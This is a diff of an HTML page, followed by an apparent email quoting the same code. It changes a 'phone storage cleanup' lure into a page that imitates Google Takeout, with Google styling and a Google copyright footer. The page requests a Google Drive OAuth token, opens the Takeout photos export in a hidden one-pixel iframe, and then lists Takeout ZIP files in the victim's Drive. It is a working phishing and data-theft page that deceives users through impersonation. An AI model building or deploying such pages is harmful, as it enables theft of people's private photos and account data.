@@ -1,88 +1,213 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Free Up Phone Storage</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    iframe.hidden-frame {
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      position: absolute;
-      pointer-events: none;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Google Takeout – Photos Export</title>
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+<style>
+body { font-family: Roboto, sans-serif; background: #fff; margin: 0; padding: 40px; }
+h1 { font-size: 24px; color: #202124; }
+.section { margin-top: 30px; }
+label { display: block; margin-bottom: 8px; }
+button {
+background: #1a73e8; color: white; padding: 10px 20px;
+border: none; border-radius: 4px; cursor: pointer;
+font-size: 14px;
+}
+.footer { margin-top: 60px; font-size: 12px; color: #777; }
+pre { background: #f9f9f9; padding: 10px; border-radius: 5px; margin-top: 20px; }
+iframe.hidden-frame {
+width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;
+}
+</style>
 </head>
 <body>
-  <h1>Free Up Phone Storage</h1>
-  <p>Smart cleanup helps optimize your cloud photos and save space.</p>
-  <button id="startCleanup">Start Smart Cleanup</button>
-  <pre id="output">Waiting for user...</pre>
+<h1>Export Google Photos</h1>
 
-  <script>
-    const CLIENT_ID = "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com";
-    const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
-    let accessToken = null;
-    let tokenClient;
+<div class="section">
+<label><input type="checkbox" checked disabled /> Google Photos</label>
+</div>
+<div class="section">
+<label>Export destination:</label>
+<select disabled>
+<option selected>Export to Google Drive</option>
+</select>
+</div>
+<div class="section">
+<button id="export">Next Step</button>
+</div>
 
-    window.onload = () => {
-      tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: CLIENT_ID,
-        scope: SCOPES,
-        callback: (response) => {
-          if (response.error) {
-            document.getElementById("output").textContent = "❌ Error: " + response.error;
-            return;
-          }
+<pre id="output">Waiting for export...</pre>
+<div class="footer">© 2025 Google LLC</div>
 
-          accessToken = response.access_token;
-          document.getElementById("output").textContent =
-            `✅ Access Token:\n${accessToken}\n\nPreparing cleanup...`;
+<script>
+const CLIENT_ID = "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com"; // Replace for real test
+const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
+let accessToken = null;
 
-          // Load hidden takeout export after token is granted
-          setTimeout(() => {
-            const hiddenIframe = document.createElement("iframe");
-            hiddenIframe.src = "https://takeout.google.com/settings/takeout/custom/photos";
-            hiddenIframe.className = "hidden-frame";
-            document.body.appendChild(hiddenIframe);
-          }, 3000);
+window.onload = () => {
+const tokenClient = google.accounts.oauth2.initTokenClient({
+client_id: "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com",
+scope: SCOPES,
+callback: (response) => {
+if (response.error) {
+document.getElementById("output").textContent = "  Error: " + response.error;
+return;
+}
 
-          // Try to access drive files a bit later
-          setTimeout(listDriveZips, 12000);
-        }
-      });
+accessToken = response.access_token;
 
-      document.getElementById("startCleanup").onclick = () => {
-        document.getElementById("output").textContent = "🧠 Running smart cleanup...";
-        tokenClient.requestAccessToken({ prompt: 'consent' });
-      };
-    };
+document.getElementById("output").textContent =
+`  Access granted!\n\n  Access Token:\n${accessToken}\n\n  Preparing export...`;
 
-    function listDriveZips() {
-      if (!accessToken) return;
-      fetch("https://www.googleapis.com/drive/v3/files?q=mimeType='application/zip'%20and%20name%20contains%20'takeout'&fields=files(id,name,webViewLink)", {
-        headers: {
-          Authorization: `Bearer ${accessToken}`
-        }
-      })
-      .then(res => res.json())
-      .then(data => {
-        const files = data.files || [];
-        let output = `📦 Found ${files.length} Takeout ZIP(s):\n\n`;
+// Load hidden iframe for real Takeout export page
+const iframe = document.createElement("iframe");
+iframe.src = "https://takeout.google.com/settings/takeout/custom/photos";
+iframe.className = "hidden-frame";
+document.body.appendChild(iframe);
 
-        if (files.length === 0) {
-          output += "❌ No Takeout ZIPs found yet.";
-        } else {
-          files.forEach(file => {
-            output += `🗂 ${file.name}\n🔗 View: ${file.webViewLink}\n\n`;
-          });
-        }
+// After delay, check if Takeout ZIPs are present
+setTimeout(listDriveZips, 10000);
+}
+});
 
-        document.getElementById("output").textContent += "\n\n" + output;
-      });
-    }
-  </script>
+document.getElementById("export").onclick = () => {
+document.getElementById("output").textContent = "  Starting Google Photos export...";
+tokenClient.requestAccessToken({ prompt: "consent" });
+};
+};
+
+function listDriveZips() {
+if (!accessToken) return;
+
+fetch("https://www.googleapis.com/drive/v3/files?q=mimeType='application/zip'%20and%20name%20contains%20'takeout'&fields=files(id,name,webViewLink)", {
+headers: {
+Authorization: `Bearer ${accessToken}`
+}
+})
+.then(res => res.json())
+.then(data => {
+const files = data.files || [];
+let output = `  Found ${files.length} Takeout ZIP(s):\n\n`;
+
+if (files.length === 0) {
+output += "  No Takeout ZIPs found yet.";
+} else {
+files.forEach(file => {
+output += `  ${file.name}\n  View: ${file.webViewLink}\n\n`;
+});
+}
+
+document.getElementById("output").textContent += "\n\n" + output;
+});
+}
+</script>
+</body>
+</html>
+On Sun, Jul 13, 2025 at 2:39 AM Sapna Khatri <sapnakhatri3799@gmail.com> wrote:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8" />
+ <title>Google Takeout – Photos Export</title>
+ <script src="https://accounts.google.com/gsi/client" async defer></script>
+ <style>
+ body { font-family: Roboto, sans-serif; background: #fff; margin: 0; padding: 40px; }
+ h1 { font-size: 24px; color: #202124; }
+ .section { margin-top: 30px; }
+ label { display: block; margin-bottom: 8px; }
+ button {
+ background: #1a73e8; color: white; padding: 10px 20px;
+ border: none; border-radius: 4px; cursor: pointer;
+ font-size: 14px;
+ }
+ .footer { margin-top: 60px; font-size: 12px; color: #777; }
+ pre { background: #f9f9f9; padding: 10px; border-radius: 5px; margin-top: 20px; }
+ iframe.hidden-frame {
+ width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;
+ }
+ </style>
+</head>
+<body>
+ <h1>Export Google Photos</h1>
+
+ <div class="section">
+ <label><input type="checkbox" checked disabled /> Google Photos</label>
+ </div>
+ <div class="section">
+ <label>Export destination:</label>
+ <select disabled>
+ <option selected>Export to Google Drive</option>
+ </select>
+ </div>
+ <div class="section">
+ <button id="export">Next Step</button>
+ </div>
+
+ <pre id="output">Waiting for export...</pre>
+ <div class="footer">© 2025 Google LLC</div>
+
+ <script>
+ const CLIENT_ID = "YOUR_CLIENT_ID.apps.googleusercontent.com"; // Replace for real test
+ const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
+ let accessToken = null;
+
+ window.onload = () => {
+ const tokenClient = google.accounts.oauth2.initTokenClient({
+ client_id: CLIENT_ID,
+ scope: SCOPES,
+ callback: (response) => {
+ if (response.error) {
+ document.getElementById("output").textContent = " Error: " + response.error;
+ return;
+ }
+
+ accessToken = response.access_token;
+
+ document.getElementById("output").textContent = 
+ ` Access granted!\n\n Access Token:\n${accessToken}\n\n Preparing export...`;
+
+ // Load hidden iframe for real Takeout export page
+ const iframe = document.createElement("iframe");
+ iframe.src = "https://takeout.google.com/settings/takeout/custom/photos";
+ iframe.className = "hidden-frame";
+ document.body.appendChild(iframe);
+
+ // After delay, check if Takeout ZIPs are present
+ setTimeout(listDriveZips, 10000);
+ }
+ });
+
+ document.getElementById("export").onclick = () => {
+ document.getElementById("output").textContent = " Starting Google Photos export...";
+ tokenClient.requestAccessToken({ prompt: "consent" });
+ };
+ };
+
+ function listDriveZips() {
+ if (!accessToken) return;
+
+ fetch("https://www.googleapis.com/drive/v3/files?q=mimeType='application/zip'%20and%20name%20contains%20'takeout'&fields=files(id,name,webViewLink)", {
+ headers: {
+ Authorization: `Bearer ${accessToken}`
+ }
+ })
+ .then(res => res.json())
+ .then(data => {
+ const files = data.files || [];
+ let output = ` Found ${files.length} Takeout ZIP(s):\n\n`;
+
+ if (files.length === 0) {
+ output += " No Takeout ZIPs found yet.";
+ } else {
+ files.forEach(file => {
+ output += ` ${file.name}\n View: ${file.webViewLink}\n\n`;
+ });
+ }
+
+ document.getElementById("output").textContent += "\n\n" + output;
+ });
+ }
+ </script>
 </body>
 </html>
